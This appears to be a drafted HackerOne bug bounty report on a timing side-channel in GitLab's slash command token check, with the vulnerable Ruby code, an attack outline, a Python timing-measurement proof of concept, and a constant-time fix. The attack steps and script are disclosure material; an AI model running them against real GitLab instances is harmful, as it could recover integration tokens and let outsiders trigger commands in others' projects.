# HackerOne Report: Timing Attack on Slash Command Integration Token

## Summary
A timing side-channel vulnerability exists in GitLab's Slash Command Integration API. The token comparison for Mattermost and Slack slash command integrations uses Ruby's standard `==` operator instead of a constant-time comparison function, potentially allowing an attacker to brute-force integration tokens through timing analysis.

## Vulnerability Type
- **CWE-208**: Observable Timing Discrepancy
- **CVSS 3.1**: Medium-High (estimated 6.0-7.5)

## Affected Component
- **File**: `lib/api/integrations.rb`
- **Line**: 70
- **Function**: `slash_command_integration`
- **Affected Integrations**: Mattermost Slash Commands, Slack Slash Commands

## Vulnerable Code

```ruby
# lib/api/integrations.rb:68-72
def slash_command_integration(project, integration_slug, params)
  project.integrations.active.find do |integration|
    integration.try(:token) == params[:token] && integration.to_param == integration_slug.underscore
  end
end
```

## Technical Details

### The Issue
When a slash command is triggered via the API endpoint `/api/v4/projects/:id/integrations/mattermost_slash_commands/trigger` or `/api/v4/projects/:id/integrations/slack_slash_commands/trigger`, the token is compared using `==`.

This creates a timing oracle:
- If the first character doesn't match: fastest response
- Each additional matching character: slightly slower response
- Statistical analysis over many requests can recover the token character-by-character

### Attack Vector
1. Attacker identifies a project with Mattermost/Slack slash commands enabled
2. Attacker sends repeated POST requests to `/api/v4/projects/:id/integrations/slack_slash_commands/trigger`
3. By measuring response times with different token guesses, attacker extracts the token
4. With the token, attacker can trigger slash commands as if they came from Slack/Mattermost

### API Endpoint
```
POST /api/v4/projects/:id/integrations/mattermost_slash_commands/trigger
POST /api/v4/projects/:id/integrations/slack_slash_commands/trigger
POST /api/v4/projects/:id/services/mattermost_slash_commands/trigger (legacy)
POST /api/v4/projects/:id/services/slack_slash_commands/trigger (legacy)
```

### Severity Amplification
- **No authentication required** - The endpoint doesn't require user authentication (it's designed for external services)
- **Direct API access** - Network timing is cleaner than browser-based timing
- **Token reuse** - These tokens are typically static and long-lived

## Proof of Concept

### Timing Measurement Script
```python
import requests
import time
import statistics

def measure_timing(url, token_guess, iterations=100):
    times = []
    for _ in range(iterations):
        start = time.perf_counter()
        requests.post(url, data={'token': token_guess, 'text': 'test'})
        times.append(time.perf_counter() - start)
    return statistics.mean(times), statistics.stdev(times)

url = "https://gitlab.example.com/api/v4/projects/1/integrations/slack_slash_commands/trigger"

# Test timing difference between no match and partial match
no_match = measure_timing(url, "AAAAAAAAAAAAAAAA")
partial_1 = measure_timing(url, "Xaaaaaaaaaaaaaaa")  # Assume 'X' is first char
partial_2 = measure_timing(url, "XYaaaaaaaaaaaaaa")  # Assume 'XY' are first chars

print(f"No match: {no_match[0]:.6f}s (±{no_match[1]:.6f})")
print(f"1 char match: {partial_1[0]:.6f}s (±{partial_1[1]:.6f})")
print(f"2 char match: {partial_2[0]:.6f}s (±{partial_2[1]:.6f})")
```

## Recommended Fix

Replace the vulnerable comparison with `ActiveSupport::SecurityUtils.secure_compare`:

```ruby
def slash_command_integration(project, integration_slug, params)
  project.integrations.active.find do |integration|
    token = integration.try(:token)
    next unless token
    
    ActiveSupport::SecurityUtils.secure_compare(token.to_s, params[:token].to_s) && 
      integration.to_param == integration_slug.underscore
  end
end
```

## Impact

- **Authentication Bypass**: Attacker can recover integration tokens without authentication
- **Integrity**: Attacker can trigger slash commands (deploy, create issues, etc.)  
- **Confidentiality**: Slash command responses may leak project information

### Potential Attack Scenarios
1. **CI/CD Manipulation**: If slash commands trigger CI/CD pipelines, attacker could manipulate builds
2. **Data Exfiltration**: Slash commands that query project data could leak information
3. **Social Engineering**: Fake slash command responses in team chat channels

## Suggested Severity
**High** - No authentication required, direct API access enables efficient timing attacks, successful exploitation allows triggering arbitrary slash commands.

## References
- [CWE-208: Observable Timing Discrepancy](https://cwe.mitre.org/data/definitions/208.html)
- [GitLab Slash Commands Documentation](https://docs.gitlab.com/ee/user/project/integrations/gitlab_slack_application.html)
- Similar pattern correctly implemented elsewhere in GitLab codebase with `Devise.secure_compare`

## Reporter
Submitted via GitLab Bug Bounty Program on HackerOne

---
**Status**: Ready for submission
**Target Program**: GitLab Bug Bounty  
**Estimated Bounty**: $3,000 - $10,000 (High severity, unauthenticated attack vector)
